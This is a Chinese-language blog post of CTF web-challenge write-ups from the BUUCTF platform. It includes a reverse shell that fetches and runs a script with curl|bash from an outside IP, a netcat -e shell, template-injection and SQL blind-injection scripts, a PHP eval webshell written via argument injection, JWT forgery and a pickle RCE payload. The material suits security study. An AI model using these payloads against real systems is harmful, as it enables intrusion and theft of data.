<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#x27;girl_friend&#x27;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#x27;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl = $_POST[&#x27;girl_friend&#x27;];</span><br><span class="line">    if (preg_match(&#x27;/\&gt;|\\\/&#x27;, $girl)) &#123;</span><br><span class="line">        die(&#x27;just girl&#x27;);          &#123;</span><br><span class="line">    &#125; else if (preg_match(&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;, $girl)) &#123;</span><br><span class="line">&#125;      &#123;echo &quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        //duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>过滤了符号，不能使用变量拼接。禁用了 base64 ，也不能编码绕过。需要反弹sehll</p>
<p>申请小号，开一个 linux lab，在 <code>/var/www/html</code>下写反弹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/174.1.54.235/4444 0&gt;&amp;1&#x27; &gt; a</span><br></pre></td></tr></table></figure>

<p>监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></table></figure>

<p>到 web 页面 POST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=curl http://174.1.54.235/a|bash</span><br></pre></td></tr></table></figure>

<p>遇到了问题，bash 会自动退出，原因不明，改成 nc 反弹 shell，监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 9999</span><br></pre></td></tr></table></figure>

<p>POST</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">girl_friend=nc 174.1.54.235 9999 -e /bin/bash</span><br></pre></td></tr></table></figure>

<p>成功得到shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -name flag</span><br><span class="line">cat /etc/demo/P3rh4ps/love/you/flag</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF2020-Cookie-is-so-stable"><a href="#BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="[BJDCTF2020]Cookie is so stable"></a>[BJDCTF2020]Cookie is so stable</h4><p>提示 cookie，在 flag 页面输入 admin，刷新抓包可以看到 cookie 里面有一个 user 字段，同时页面上显示 Hello，admin。输入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到2，模板注入。burp 里把 user 字段改成下面的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h4><p>代码审计，<code>/?text=php://input&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code>，POST <code>I have a dream</code>，得到 next.php 源码，也可以用<code>data://text/plain,I%20have%20a%20dream</code></p>
<p>next.php 存在带 <code>/e</code>的 preg_replace，<code>/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;cat /flag&#39;);</code></p>
<h4 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h4><p>Hint 里提到知道 IP，抓包改 XFF，显示的 IP 就会变，想到模板注入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>显示了2，确实存在模板注入，模板是 Smarty</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: &#123;&#123;system(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="BJDCTF-2nd-简单注入"><a href="#BJDCTF-2nd-简单注入" class="headerlink" title="[BJDCTF 2nd]简单注入"></a>[BJDCTF 2nd]简单注入</h4><p>打个引号就告诉我 Stop hacking，看下 robots.txt，有 hint.txt</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Only u input the correct password then u can get the flag</span><br><span class="line">and p3rh4ps wants a girl friend.</span><br><span class="line"></span><br><span class="line">select * from users where username=&#x27;$_POST[&quot;username&quot;]&#x27; and password=&#x27;$_POST[&quot;password&quot;]&#x27;;</span><br></pre></td></tr></table></figure>

<p>过滤了<code>select</code>，<code>=</code>，<code>&#39;</code>，<code>union</code>，<code>and</code>，<code>;</code>，<code>&quot;</code></p>
<p>可以在username 使用<code>\</code>转义单引号，就可以在 password 处执行查询了，之后就是常规盲注。抄个脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &quot;http://bc5d0433-45b5-486d-8fdd-541a8662fd10.node3.buuoj.cn/index.php&quot;</span><br><span class="line"></span><br><span class="line">data = &#123;&quot;username&quot;:&quot;admin\\&quot;,&quot;password&quot;:&quot;&quot;&#125;</span><br><span class="line">result = &quot;&quot;</span><br><span class="line">i = 0</span><br><span class="line"></span><br><span class="line">while( True ):</span><br><span class="line">	i = i + 1 </span><br><span class="line">	head=32</span><br><span class="line">	tail=127</span><br><span class="line"></span><br><span class="line">	while( head &lt; tail ):</span><br><span class="line">		mid = (head + tail) &gt;&gt; 1</span><br><span class="line"></span><br><span class="line">		#payload = &quot;or/**/if(ascii(substr(username,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">		payload = &quot;or/**/if(ascii(substr(password,%d,1))&gt;%d,1,0)#&quot;%(i,mid)</span><br><span class="line">		</span><br><span class="line">		data[&#x27;password&#x27;] = payload</span><br><span class="line">		r = requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">		if &quot;stronger&quot; in r.text :</span><br><span class="line">			head = mid + 1</span><br><span class="line">		else:</span><br><span class="line">			tail = mid</span><br><span class="line">	</span><br><span class="line">	last = result</span><br><span class="line">	</span><br><span class="line">	if head!=32:</span><br><span class="line">		result += chr(head)</span><br><span class="line">	else:</span><br><span class="line">		break</span><br><span class="line">	print(result)</span><br></pre></td></tr></table></figure>





<h4 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h4><p>git 源码泄露</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;y&#x27;d&#x27;s</span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>

<p>看着很复杂，不要有思维定势觉得一定要走到最后一行，实际上在<code>exit()</code>中就可以得到结果。几个 exit 条件中，不传入 flag 的这一条最容易实现，会输出 <code>$yds</code>，所以直接 GET 传入<code>yds=flag</code>，会把真正的flag赋值给<code>$yds</code>，再 exit 就得到了flag。</p>
<h4 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h4><p>同时使用escapechellargs和escapeshellcmd会出现问题，用单引号包含的参数会导致参数注入。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;</span><br><span class="line"># escapeshellargs先对单引号转义</span><br><span class="line">\&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php \&#x27;</span><br><span class="line"># 然后对反斜线分隔的每个部分加单引号</span><br><span class="line">&#x27;&#x27;\&#x27;&#x27; &lt;?php @eval($_POST[&quot;hack&quot;]);?&gt; -oG hack.php &#x27;\&#x27;&#x27;&#x27;</span><br><span class="line"># escapeshellcmd对其他特殊字符转义，但不转义单引号</span><br><span class="line">&#x27;&#x27;\\&#x27;&#x27; \&lt;\?php \@eval(\$_POST\[\&quot;hack\&quot;\]);\?\&gt; -oG hack.php &#x27;\\&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<h4 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>有robots.txt，看到*.php.bak，看看index的源码，有个image.php还有user.php，image.php.bak可以下载。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;</span><br><span class="line">$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;</span><br><span class="line"></span><br><span class="line">$id=addslashes($id);</span><br><span class="line">$path=addslashes($path);</span><br><span class="line"></span><br><span class="line">$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);</span><br><span class="line">$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);</span><br><span class="line"></span><br><span class="line">$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);</span><br><span class="line">$row=mysqli_fetch_array($result,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line">$path=&quot;./&quot; . $row[&quot;path&quot;];</span><br><span class="line">header(&quot;Content-Type: image/jpeg&quot;);</span><br><span class="line">readfile($path);</span><br></pre></td></tr></table></figure>

<p>addslashes在单双引号、反斜杠和空字符前加上反斜杠，strreplace把数组中的内容删除。</p>
<p>这里思路窄了，以为只要一个位置就可以，怎么也弄不出来单引号。但实际上在path后面有一个单引号，只要有一个反斜杠来转义id后面的引号就可以了。可以使用<code>\\0</code>，addslashes变成<code>\\\\0</code>，strreplace变成<code>\</code>。由于没有显示位，使用布尔盲注。当id=1时有图片，id=0时显示有错误。</p>
<h4 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h4><p>函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">scandir() # 返回指定目录中的文件和目录的数组</span><br><span class="line">base_convert() # 转换禁止</span><br><span class="line">dechex() # 十进制转为十六进制</span><br><span class="line">hex2bin() # 十六进制转为ASCII字符</span><br><span class="line">var_dump() # 输出变量信息</span><br><span class="line">readfile() # 输出文件</span><br></pre></td></tr></table></figure>

<p>特性：</p>
<ul>
<li>动态函数：可以把函数名用字符串传递给变量，通过此变量动态调用函数。<code>$func=&#39;die&#39;;$func();</code></li>
<li>函数名默认为字符串</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span><br><span class="line">if(!isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    //例子 c=20-1</span><br><span class="line">    $content = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if (strlen($content) &gt;= 80) &#123;</span><br><span class="line">        die(&quot;太长了不会算&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [&#x27; &#x27;, &#x27;\t&#x27;, &#x27;\r&#x27;, &#x27;\n&#x27;,&#x27;\&#x27;&#x27;, &#x27;&quot;&#x27;, &#x27;`&#x27;, &#x27;\[&#x27;, &#x27;\]&#x27;];</span><br><span class="line">    foreach ($blacklist as $blackitem) &#123;</span><br><span class="line">        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $content)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的字符&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span><br><span class="line">    $whitelist = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;, &#x27;base_convert&#x27;, &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27;, &#x27;dechex&#x27;, &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">    preg_match_all(&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;, $content, $used_funcs);  </span><br><span class="line">    foreach ($used_funcs[0] as $func) &#123;</span><br><span class="line">        if (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            die(&quot;请不要输入奇奇怪怪的函数&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    //帮你算出答案</span><br><span class="line">    eval(&#x27;echo &#x27;.$content.&#x27;;&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能出现blacklist中的内容，preg_match_all得到的内容必须在whitelist里，同时payload有长度限制。</p>
<p>方法一：构造<code>$_GET</code></p>
<p><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi)&#123;pi&#125;(($$pi)&#123;abs&#125;)&amp;pi=system&amp;abs=ls /</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">base_convert(37907361743,10,36) ==&gt;  &quot;hex2bin&quot;</span><br><span class="line">dechex(1598506324)  ==&gt;  &quot;5f474554&quot;</span><br><span class="line">base_convert(37907361743,10,36)(dechex(1598506324))</span><br><span class="line">==&gt; hex2bin(&quot;5f474554&quot;) ==&gt; &quot;_GET&quot;</span><br><span class="line">$_GET&#123;pi&#125;&#123;$_GET&#123;abs&#125;&#125; ==&gt; system(&#x27;ls /&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>方法二：构造<code>getallheaders</code></p>
<p><code>$pi=base_convert,$pi(696468,10,36)($pi(8768397090111664438,10,30)()&#123;1&#125;)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">base_convert(696468,10,36) =&gt; &quot;exec&quot;</span><br><span class="line">$pi(8768397090111664438,10,30) =&gt; &quot;getallheaders&quot;</span><br><span class="line">exec(getallheaders()&#123;1&#125;)</span><br></pre></td></tr></table></figure>

<p>发包时用burp抓包，在headers添加<code>1: cat /flag</code></p>
<p>方法三：异或</p>
<p>fuzz：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$payload = [&#x27;abs&#x27;, &#x27;acos&#x27;, &#x27;acosh&#x27;, &#x27;asin&#x27;, &#x27;asinh&#x27;, &#x27;atan2&#x27;, &#x27;atan&#x27;, &#x27;atanh&#x27;,  &#x27;bindec&#x27;, &#x27;ceil&#x27;, &#x27;cos&#x27;, &#x27;cosh&#x27;, &#x27;decbin&#x27; , &#x27;decoct&#x27;, &#x27;deg2rad&#x27;, &#x27;exp&#x27;, &#x27;expm1&#x27;, &#x27;floor&#x27;, &#x27;fmod&#x27;, &#x27;getrandmax&#x27;, &#x27;hexdec&#x27;, &#x27;hypot&#x27;, &#x27;is_finite&#x27;, &#x27;is_infinite&#x27;, &#x27;is_nan&#x27;, &#x27;lcg_value&#x27;, &#x27;log10&#x27;, &#x27;log1p&#x27;, &#x27;log&#x27;, &#x27;max&#x27;, &#x27;min&#x27;, &#x27;mt_getrandmax&#x27;, &#x27;mt_rand&#x27;, &#x27;mt_srand&#x27;, &#x27;octdec&#x27;, &#x27;pi&#x27;, &#x27;pow&#x27;, &#x27;rad2deg&#x27;, &#x27;rand&#x27;, &#x27;round&#x27;, &#x27;sin&#x27;, &#x27;sinh&#x27;, &#x27;sqrt&#x27;, &#x27;srand&#x27;, &#x27;tan&#x27;, &#x27;tanh&#x27;];</span><br><span class="line">for($k=1;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">    for($i = 0;$i &lt; 9; $i++)&#123;</span><br><span class="line">        for($j = 0;$j &lt;=9;$j++)&#123;</span><br><span class="line">            $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">            echo($payload[$k].&quot;^$i$j&quot;.&quot;==&gt;$exp&quot;);</span><br><span class="line">            echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>$pi=(is_nan^(6).(4)).(tan^(1).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=cat%20/flag</code></p>
<h4 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h4><p>先注册个账号，找到lv6的号，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://26f12b49-df5d-419d-9c3a-50988d616703.node1.buuoj.cn/shop?page=&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1000):</span><br><span class="line">    r = requests.get(url + str(i))</span><br><span class="line">    if &quot;lv6.png&quot; in r.text:</span><br><span class="line">        print i</span><br><span class="line">        break</span><br></pre></td></tr></table></figure>

<p>然后购买，抓包，把discount改成0.000000000001，就可以买下来。</p>
<p>发现只有admin可以访问，查看cookie，有一个jwt，到 jwt.io ，解码，把 username 改为admin ，用 <a target="_blank" rel="noopener" href="https://github.com/brendan-rius/c-jwt-cracker%EF%BC%8C%E8%B7%91%E5%87%BA%E7%AD%BE%E5%90%8D%E4%B8%BA">https://github.com/brendan-rius/c-jwt-cracker，跑出签名为</a> 1Kun，再到 jwt.io得到 jwt，<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo</code>，用edit this cookie改成新的jwt，刷新可以看到 “一键成为大会员”，也可以看到源码，打开源码里面admin.py，看到pickle.loads(urllib.qoute(become))，（反序列化文章，<a target="_blank" rel="noopener" href="http://www.sohu.com/a/274879579_729271%EF%BC%89%EF%BC%8C%E4%B8%80%E9%94%AE%E6%88%90%E4%B8%BA%E5%A4%A7%E4%BC%9A%E5%91%98%E6%8C%89%E9%92%AE%E4%BC%9Apost%E4%B8%80%E4%B8%AA">http://www.sohu.com/a/274879579_729271），一键成为大会员按钮会post一个</a> become 参数，利用反序列化漏洞读取flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import urllib</span><br><span class="line">&gt;&gt;&gt; import pickle</span><br><span class="line">&gt;&gt;&gt; class a(object):</span><br><span class="line">...     def __reduce__(self):</span><br><span class="line">...             return (eval,(&quot;open(&#x27;/flag.txt&#x27;,&#x27;r&#x27;).read()&quot;,))</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; a = pickle.dumps(a())</span><br><span class="line">&gt;&gt;&gt; a = urllib.quote(a)</span><br><span class="line">&gt;&gt;&gt; print a</span><br></pre></td></tr></table></figure>

<p>得到<code>c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</code>，抓包，把become=admin改成上面的字符串，得到flag</p>
<h4 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h4><p>一共就两条数据，过滤了空格，and，or，布尔盲注。</p>
<p>可以使用<code>id=0^[payload]</code>或者<code>id=if([payload],1,2)</code>。后者只能用于数字型。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://c30faac4-d474-4905-a58f-c43c968a74ac.node3.buuoj.cn:80/index.php&quot;</span><br><span class="line">i = 1</span><br><span class="line">while True:</span><br><span class="line">    left = 32</span><br><span class="line">    right = 127</span><br><span class="line">    while True:</span><br><span class="line">        if right - left == 1:</span><br><span class="line">            print(chr(right), end=&#x27;&#x27;)</span><br><span class="line">            break</span><br><span class="line">        mid = int((right+left)/2)</span><br><span class="line">        data = &#123;&quot;id&quot;: &quot;if(ascii(mid((select(flag)from(flag)),&#123;&#125;,1))&gt;&#123;&#125;,1,2)&quot;.format(i, mid)&#125;</span><br><span class="line">        r = requests.post(url, data=data, proxies=&#123;&#x27;http&#x27;:&#x27;127.0.0.1:9999&#x27;&#125;)</span><br><span class="line">        if &#x27;Hello&#x27; in r.text:</span><br><span class="line">            left = mid</span><br><span class="line">        else:</span><br><span class="line">            right = mid</span><br><span class="line">    i += 1</span><br></pre></td></tr></table></figure>

<p>可能是在<code>print()</code>函数中用<code>end</code>关键字参数的话不会刷新缓冲区，大概觉着跑完了就Ctrl+C，就能看到结果了 = =。</p>
<h4 id="CISCN2019-总决赛-Day2-Web1-Easyweb-1"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb-1" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h4><p>robots.txt，有 image.php.bak</p>
